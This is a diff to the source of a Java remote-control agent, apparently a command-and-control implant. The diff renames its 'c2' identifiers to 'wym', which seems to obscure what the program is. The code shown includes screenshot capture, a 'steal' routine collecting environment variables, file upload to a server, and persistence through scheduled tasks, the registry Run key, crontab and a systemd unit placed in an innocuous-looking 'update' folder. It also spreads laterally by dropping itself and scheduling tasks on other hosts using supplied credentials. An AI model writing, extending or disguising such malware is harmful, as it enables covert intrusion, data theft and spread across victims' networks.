@@ -47,14 +47,14 @@ import java.util.zip.ZipOutputStream;
  *                  --interval 5 --jitter 2 --verbose
  *
  * Environment variables (accepted when the flag is not given):
- *     C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+ *     WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
  *
  * Flags:
- *     --server URL      server base URL (required unless C2_SERVER is set)
- *     --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+ *     --server URL      server base URL (required unless WYM_SERVER is set)
+ *     --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
  *     --interval N      heartbeat interval in seconds (default 10, min 1)
  *     --jitter N        random jitter in seconds added to the interval
- *     --state FILE      state file persisting the agent id (default ~/.c2agent_java.json)
+ *     --state FILE      state file persisting the agent id (default ~/.wymagent_java.json)
  *     --verbose         print activity to stdout
  *     -h, --help        show this help and exit
  *
@@ -503,7 +503,7 @@ class Agent {
 
     static Resp uploadBytes(String taskId, String filename, String contentType, byte[] data)
             throws IOException {
-        String boundary = "c2boundary" + System.nanoTime();
+        String boundary = "wymboundary" + System.nanoTime();
         byte[] body = multipartBody(filename, contentType, data, boundary);
         Map<String, String> h = new HashMap<String, String>();
         h.put("Content-Type", "multipart/form-data; boundary=" + boundary);
@@ -833,7 +833,7 @@ class Agent {
     static Map<String, Object> taskScreenshot(String taskId, Map<String, Object> args) {
         File tmp = null;
         try {
-            tmp = File.createTempFile("c2shot-", ".png");
+            tmp = File.createTempFile("wymshot-", ".png");
             String shotPath = tmp.getAbsolutePath();
             tmp.delete();
             boolean ok = true;
@@ -1029,7 +1029,7 @@ class Agent {
         }
         File work = null;
         try {
-            work = Files.createTempDirectory("c2steal_").toFile();
+            work = Files.createTempDirectory("wymsteal_").toFile();
             List<String> manifest = new ArrayList<String>();
             if (profile.equals("all") || profile.equals("env")) {
                 log("steal: collecting env vars");
@@ -1303,11 +1303,11 @@ class Agent {
                 String appdata = System.getenv("APPDATA");
                 if (appdata == null || appdata.isEmpty()) appdata = System.getenv("USERPROFILE");
                 if (appdata == null || appdata.isEmpty()) appdata = ".";
-                File dir = new File(appdata, "Microsoft\\Windows\\c2update");
+                File dir = new File(appdata, "Microsoft\\Windows\\wymupdate");
                 dir.mkdirs();
-                dest = new File(dir, "c2agent.exe");
+                dest = new File(dir, "wymagent.exe");
             } else {
-                File dir = new File(homeDir(), ".config/c2update");
+                File dir = new File(homeDir(), ".config/wymupdate");
                 dir.mkdirs();
                 dest = new File(dir, pathBase(self));
             }
@@ -1320,9 +1320,9 @@ class Agent {
             String progdata = System.getenv("ProgramData");
             if (progdata == null || progdata.isEmpty()) progdata = System.getenv("ALLUSERSPROFILE");
             if (progdata == null || progdata.isEmpty()) progdata = "C:\\ProgramData";
-            File launchDir = new File(progdata, "c2update");
+            File launchDir = new File(progdata, "wymupdate");
             launchDir.mkdirs();
-            File launcher = new File(launchDir, "c2relaunch.cmd");
+            File launcher = new File(launchDir, "wymrelaunch.cmd");
             try {
                 Files.write(launcher.toPath(),
                     ("@echo off\r\nstart \"\" /b " + relaunch + "\r\n").getBytes(StandardCharsets.UTF_8));
@@ -1331,13 +1331,13 @@ class Agent {
             }
             out.append("\npersistence: wrote launcher ").append(launcher);
             boolean ok = false;
-            String cmd = "schtasks /Create /TN \"c2agent-persist\" /TR \"" + launcher
+            String cmd = "schtasks /Create /TN \"wymagent-persist\" /TR \"" + launcher
                 + "\" /SC ONLOGON /RL HIGHEST /F";
             ProcessResult pr = execCapture(cmd, 60);
             if (pr.exitCode == 0) ok = true;
             else {
                 out.append("\n  schtasks err: ").append(trimLine(pr.output));
-                String reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d "
+                String reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d "
                     + launcher + " /f";
                 pr = execCapture(reg, 60);
                 if (pr.exitCode == 0) ok = true;
@@ -1347,16 +1347,16 @@ class Agent {
             return result(out.toString(), ok ? 0 : 1);
         }
         boolean okCron = false, okSys = false;
-        String line = "@reboot " + relaunch + " # c2agent-persist";
-        String cmd = "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"" + line + "\") | crontab -";
+        String line = "@reboot " + relaunch + " # wymagent-persist";
+        String cmd = "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"" + line + "\") | crontab -";
         ProcessResult pr = execCapture(cmd, 60);
         if (pr.exitCode == 0) okCron = true;
         else out.append("\n  crontab err: ").append(trimLine(pr.output));
-        File unit = new File(new File(homeDir(), ".config/c2update"), "c2-update.service");
+        File unit = new File(new File(homeDir(), ".config/wymupdate"), "wym-update.service");
         try {
             Files.write(unit.toPath(), (
                 "[Unit]\n"
-                + "Description=c2 agent update\n\n"
+                + "Description=wym agent update\n\n"
                 + "[Service]\n"
                 + "Type=simple\n"
                 + "ExecStart=/bin/sh -c \"" + relaunch + "\"\n"
@@ -1430,8 +1430,8 @@ class Agent {
         String subnet = jsonGetStr(args, "subnet");
         String user = jsonGetStr(args, "user");
         String pass = jsonGetStr(args, "pass");
-        String eu = System.getenv("C2_LAT_USER");
-        String ep = System.getenv("C2_LAT_PASS");
+        String eu = System.getenv("WYM_LAT_USER");
+        String ep = System.getenv("WYM_LAT_PASS");
         if (user.isEmpty() && eu != null) user = eu;
         if (pass.isEmpty() && ep != null) pass = ep;
 
@@ -1453,7 +1453,7 @@ class Agent {
             String host = u32ToIp(ipu);
             String status;
             if (user.isEmpty() || pass.isEmpty()) {
-                status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
+                status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
                 skipped++;
             } else if (isWindows()) {
                 String name = pathBase(self);
@@ -1471,11 +1471,11 @@ class Agent {
                         status = "failed (copy: " + trimLine(pr.output) + ")";
                         failed++;
                     } else {
-                        String cmd = "schtasks /Create /S " + host + " /TN \"c2agent-lateral\" /TR \""
+                        String cmd = "schtasks /Create /S " + host + " /TN \"wymagent-lateral\" /TR \""
                             + relaunch + "\" /SC ONLOGON /RU " + user + " /RP " + pass
                             + " /RL HIGHEST /F";
                         pr = execCapture(cmd, 30);
-                        if (pr.exitCode == 0) status = "deployed (file dropped + scheduled c2agent-lateral)";
+                        if (pr.exitCode == 0) status = "deployed (file dropped + scheduled wymagent-lateral)";
                         else status = "deployed (file dropped; task: " + trimLine(pr.output) + ")";
                         deployed++;
                     }
@@ -1731,22 +1731,22 @@ class Agent {
         System.out.println("usage: java Agent --server URL --token TOKEN"
             + " [--interval N] [--jitter N] [--state FILE] [--verbose]");
         System.out.println();
-        System.out.println("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):");
-        System.out.println("  --server URL      server base URL (required unless C2_SERVER is set)");
-        System.out.println("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)");
+        System.out.println("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):");
+        System.out.println("  --server URL      server base URL (required unless WYM_SERVER is set)");
+        System.out.println("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)");
         System.out.println("  --interval N      heartbeat interval in seconds (default 10, min 1)");
         System.out.println("  --jitter N        random jitter in seconds added to the interval");
-        System.out.println("  --state FILE      state file persisting the agent id (default ~/.c2agent_java.json)");
+        System.out.println("  --state FILE      state file persisting the agent id (default ~/.wymagent_java.json)");
         System.out.println("  --verbose         print activity to stdout");
         System.out.println("  -h, --help        show this help and exit");
     }
 
     public static void main(String[] args) {
-        String serverArg = System.getenv("C2_SERVER");
-        String tokenArg = System.getenv("C2_TOKEN");
+        String serverArg = System.getenv("WYM_SERVER");
+        String tokenArg = System.getenv("WYM_TOKEN");
         long intervalArg = 10;
         long jitterArg = 0;
-        String stateArg = homeFile(".c2agent_java.json");
+        String stateArg = homeFile(".wymagent_java.json");
         boolean verboseArg = false;
         boolean intervalGiven = false;
         boolean jitterGiven = false;
@@ -1766,31 +1766,31 @@ class Agent {
         }
 
         if (!intervalGiven) {
-            String iv = System.getenv("C2_INTERVAL");
+            String iv = System.getenv("WYM_INTERVAL");
             if (iv != null && !iv.isEmpty()) {
                 try { intervalArg = Math.max(1, Long.parseLong(iv)); } catch (NumberFormatException e) {}
             }
         }
         if (!jitterGiven) {
-            String jt = System.getenv("C2_JITTER");
+            String jt = System.getenv("WYM_JITTER");
             if (jt != null && !jt.isEmpty()) {
                 try { jitterArg = Math.max(0, Long.parseLong(jt)); } catch (NumberFormatException e) {}
             }
         }
         if (!stateGiven) {
-            String sf = System.getenv("C2_STATE_FILE");
+            String sf = System.getenv("WYM_STATE_FILE");
             if (sf != null && !sf.isEmpty()) stateArg = sf;
         }
-        String vb = System.getenv("C2_VERBOSE");
+        String vb = System.getenv("WYM_VERBOSE");
         if (!verboseArg && vb != null && (vb.equals("1") || vb.equals("true"))) verboseArg = true;
 
         if (tokenArg == null || tokenArg.isEmpty()) {
-            System.err.println("--token is required (or set C2_TOKEN)");
+            System.err.println("--token is required (or set WYM_TOKEN)");
             usage();
             System.exit(1);
         }
         if (serverArg == null || serverArg.isEmpty()) {
-            System.err.println("--server is required (or set C2_SERVER)");
+            System.err.println("--server is required (or set WYM_SERVER)");
             usage();
             System.exit(1);
         }
